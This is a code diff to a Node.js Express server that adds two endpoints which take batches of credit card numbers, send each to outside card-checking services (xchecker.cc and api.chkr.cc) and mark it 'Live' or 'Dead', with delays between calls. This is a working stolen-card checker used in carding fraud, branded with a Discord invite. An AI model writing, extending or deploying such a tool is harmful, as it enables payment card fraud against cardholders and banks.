@@ -1,23 +1,104 @@
 const express = require('express');
+const path = require('path');
+const fetch = require('node-fetch');
 const app = express();
 
 app.use(express.json());
 app.use(express.static('public'));
 
-// Error handling middleware
-app.use((err, req, res, next) => {
-    console.error(err.stack);
-    res.status(500).json({
-        success: false,
-        error: 'Server Error',
-        message: 'Gateway Error | .gg/aeolous'
-    });
+// Basic Checker (xchecker)
+app.post('/api/basic/check', async (req, res) => {
+    try {
+        const { cards } = req.body;
+        if (!Array.isArray(cards) || cards.length > 20) {
+            return res.status(400).json({
+                success: false,
+                error: 'Invalid input'
+            });
+        }
+
+        const results = [];
+        for (const card of cards) {
+            try {
+                const response = await fetch(`https://xchecker.cc/api.php?cc=${encodeURIComponent(card)}`);
+                const data = await response.json();
+                results.push({
+                    card,
+                    status: data.status,
+                    message: data.details || 'Card Declined | .gg/aeolous'
+                });
+            } catch (error) {
+                results.push({
+                    card,
+                    status: 'Dead',
+                    message: 'Gateway Error | .gg/aeolous'
+                });
+            }
+            await new Promise(r => setTimeout(r, 2000));
+        }
+
+        res.json({ success: true, results });
+
+    } catch (error) {
+        res.status(500).json({
+            success: false,
+            error: 'Server Error | .gg/aeolous'
+        });
+    }
 });
 
-// API routes with error handling
-app.use('/api/basic', require('./api/basic.js'));
-app.use('/api/pro', require('./api/pro.js'));
-app.use('/api/luhn', require('./api/luhn.js'));
+// Pro Checker (chkr.cc)
+app.post('/api/pro/check', async (req, res) => {
+    try {
+        const { cards } = req.body;
+        if (!Array.isArray(cards) || cards.length > 20) {
+            return res.status(400).json({
+                success: false,
+                error: 'Invalid input'
+            });
+        }
+
+        const results = [];
+        for (const card of cards) {
+            try {
+                const response = await fetch('https://api.chkr.cc/', {
+                    method: 'POST',
+                    headers: {
+                        'Accept': '*/*',
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: new URLSearchParams({
+                        data: card,
+                        charge: 'false'
+                    })
+                });
+
+                const data = await response.json();
+                results.push({
+                    card,
+                    status: data.code === 1 ? 'Live' : 'Dead',
+                    message: data.message || 'Card Declined | .gg/aeolous',
+                    capture: data.card
+                });
+            } catch (error) {
+                results.push({
+                    card,
+                    status: 'Dead',
+                    message: 'Gateway Error | .gg/aeolous'
+                });
+            }
+            await new Promise(r => setTimeout(r, 3000));
+        }
+
+        res.json({ success: true, results });
+
+    } catch (error) {
+        res.status(500).json({
+            success: false,
+            error: 'Server Error | .gg/aeolous'
+        });
+    }
+});
 
 // Main routes
 app.get('/', (req, res) => {
